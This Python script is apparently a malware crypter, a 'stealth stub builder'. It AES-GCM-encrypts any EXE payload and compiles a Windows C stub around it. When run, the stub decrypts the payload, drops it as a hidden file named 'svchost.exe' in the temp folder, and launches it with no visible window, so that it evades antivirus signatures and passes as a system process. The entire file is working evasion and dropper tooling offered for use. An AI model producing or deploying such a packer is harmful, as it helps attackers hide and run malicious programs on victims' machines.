import os
import argparse
import subprocess
import secrets
from Crypto.Cipher import AES

def generate_aes_stub(input_exe, output_exe):
    with open(input_exe, 'rb') as f:
        plaintext = f.read()

    key = secrets.token_bytes(32)  # 256-bit AES key
    iv = secrets.token_bytes(12)   # 96-bit nonce
    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)

    def c_array(data):
        return ', '.join(f'0x{b:02x}' for b in data)

    c_code = f"""
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

unsigned char key[] = {{ {c_array(key)} }};
unsigned char iv[]  = {{ {c_array(iv)} }};
unsigned char tag[] = {{ {c_array(tag)} }};
unsigned char enc_data[] = {{ {c_array(ciphertext)} }};
unsigned int enc_len = {len(ciphertext)};

// Link with -lcrypt32
int aes_gcm_decrypt(BYTE* ciphertext, DWORD ciphertext_len, BYTE* plaintext) {{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbResult = 0;
    DWORD keyObjectSize = 0, resultSize = 0;
    BYTE *keyObject = NULL;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return 1;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status)) return 1;

    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjectSize, sizeof(DWORD), &cbResult, 0);
    keyObject = (BYTE*)HeapAlloc(GetProcessHeap(), 0, keyObjectSize);

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject, keyObjectSize, key, sizeof(key), 0);
    if (!BCRYPT_SUCCESS(status)) return 1;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = iv;
    authInfo.cbNonce = sizeof(iv);
    authInfo.pbTag = tag;
    authInfo.cbTag = sizeof(tag);

    status = BCryptDecrypt(hKey, ciphertext, ciphertext_len, &authInfo, NULL, 0, plaintext, ciphertext_len, &resultSize, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    HeapFree(GetProcessHeap(), 0, keyObject);

    return BCRYPT_SUCCESS(status) ? 0 : 1;
}}

int main() {{
    BYTE* decrypted = (BYTE*)VirtualAlloc(NULL, enc_len, MEM_COMMIT, PAGE_READWRITE);
    if (!decrypted) return 1;

    if (aes_gcm_decrypt(enc_data, enc_len, decrypted) != 0) {{
        return 1;
    }}

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    strcat(tempPath, "svchost.exe");

    HANDLE hFile = CreateFileA(tempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 1;

    DWORD written;
    WriteFile(hFile, decrypted, enc_len, &written, NULL);
    CloseHandle(hFile);

    STARTUPINFOA si = {{0}};
    PROCESS_INFORMATION pi = {{0}};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    CreateProcessA(NULL, tempPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    return 0;
}}
"""

    c_file = "aes_stub.c"
    with open(c_file, "w") as f:
        f.write(c_code)

    os.makedirs(os.path.dirname(output_exe), exist_ok=True)

    result = subprocess.run([
        "x86_64-w64-mingw32-gcc", "-O2", "-s", c_file, "-o", output_exe, "-lbcrypt"
    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    if result.returncode == 0:
        print(f"[+] AES-GCM stealth stub created: {output_exe}")
    else:
        print("[!] Compilation failed:")
        print(result.stderr.decode())

    os.remove(c_file)

def main():
    parser = argparse.ArgumentParser(description="AES-GCM encrypted stealth stub builder")
    parser.add_argument("exe", help="Path to EXE payload")
    parser.add_argument("-o", "--output", default="build/aes_stub.exe", help="Output stub EXE path")
    args = parser.parse_args()

    if not os.path.exists(args.exe):
        print(f"[!] File not found: {args.exe}")
        return

    generate_aes_stub(args.exe, args.output)

if __name__ == "__main__":
    main()
